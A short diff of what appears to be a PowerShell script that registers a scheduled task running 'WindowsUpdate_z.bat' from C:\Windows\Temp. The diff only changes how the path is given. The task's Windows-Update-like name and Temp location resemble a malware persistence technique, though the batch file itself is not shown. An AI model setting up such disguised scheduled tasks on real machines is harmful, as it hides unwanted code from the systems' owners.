@@ -4,7 +4,8 @@ echo [+] Creating Task...
 
 #action
 $taskAction = New-ScheduledTaskAction `
-    -Execute 'C:\Windows\Temp\WindowsUpdate_z.bat'
+    -Execute 'WindowsUpdate_z.bat' `
+    -WorkingDirectory "C:\Windows\Temp"
 
 #triggering
 $trigger = New-ScheduledTaskTrigger `
